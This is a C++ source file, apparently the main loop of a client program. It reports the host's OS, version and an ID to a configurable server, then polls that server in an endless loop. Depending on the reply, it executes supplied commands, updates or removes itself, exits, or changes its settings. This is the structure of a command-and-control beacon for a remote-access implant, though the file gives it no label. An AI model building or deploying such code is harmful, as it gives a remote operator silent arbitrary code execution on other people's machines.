//
// Created by christian on 4/13/23.
//

#include <string>
#include "../lib/http.hpp"
#include "../lib/json.hpp"
#include "../state.h"
#include "functions.h"
#include "../printers.h"
#include "../config.h"

using namespace std;
using json = nlohmann::json;
using namespace std::this_thread;     // sleep_for, sleep_until
using namespace std::chrono_literals; // ns, us, ms, s, h, etc.
using std::chrono::system_clock;

// set the operating exec of the device based on the compilation
#ifdef _WIN32
const OS os = OS::WINDOWS;
#endif
#ifdef unix
const OS os = OS::UNIX;
#endif
#ifdef __MACH__
const OS os = OS::MACOS;
#endif

/**
 * @brief Handles the new state given
 * @param data json - the required data, following fmt.json
 * @param cli httplib::Client - a client instance of the server
 * @param settings the settings, modifiable
 */
auto handle_state(json data, httplib::Client &cli, json &settings) -> void;

auto main(int argc, char **argv) -> int {
  const string version = "0.0.1";
  auto server = argc > 1 ? argv[1] : server_address;
  json settings = {
      {"wait_duration", 10},
  };
  httplib::Client cli(server);
  // The default info
  json info = {
      {"version", version},
      {"os", os},
      {"id", cli.Get("/id")->body},
  };

  DEBUG("Client started");
  while (true) { // infinite loop
    DEBUG("Getting time");
    info["time"] = time(nullptr);
    DEBUG("Sending request");
    auto res = cli.Post("/opt", info.dump(), "application/json");
    DEBUG("Parsing request");
    // parse the response into a usable format
    json response = json::parse(res->body);

    DEBUG("Handling request...");
    // handle the task
    handle_state(response, cli, settings);

    DEBUG("Handling request done");

    sleep_for(chrono::seconds(settings["wait_duration"].get<int>())); // don't overload the server when idle

  }
}

auto handle_state(json data, httplib::Client &cli, json &settings) -> void {
  switch (State(data["new_state"])) {
    case State::remove:remove();
      break;
    case State::kill:exit(69);
    case State::idle: // don't do anything
      break;
    case State::print:print(data["data"]);
      break;
    case State::exec:exec(data["data"]);
      break;
    case State::update:update(cli);
      break;
    case State::settings:set_settings(data["data"], settings);
  }
}
